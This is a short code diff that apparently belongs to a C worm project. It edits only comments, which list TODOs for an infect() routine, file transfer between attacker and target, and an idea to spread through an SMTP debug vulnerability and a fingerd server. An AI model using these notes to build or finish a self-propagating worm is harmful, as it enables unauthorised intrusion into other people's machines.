@@ -1,7 +1,7 @@
 /*
 TODO:
 - add send_file_over_socket.c functionality to attacker logic. For some reason I thought we only needed receive_file.c on the target
-- ensure that the correct BSD versions of the files are being pulled in (they arent right now)
+- ensure that the correct BSD versions of the files are being pulled in (they arent right now?)
 - ensure the "&" command actually runs the compiled programs (could use "./" instead?)
 - convert this file to old C so that this can be ran on BSD systems
 - test this program at all...
@@ -209,7 +209,7 @@ void infect(char *ip, char *my_ip) {
     */
 
     /* 
-    12:37am idea: Use SMTP debug vulnerablity to pull the files over instead...
+    Idea: Use SMTP debug vulnerablity to pull the files over instead...
 
     Something like this:
         - connect socket to fingerd server
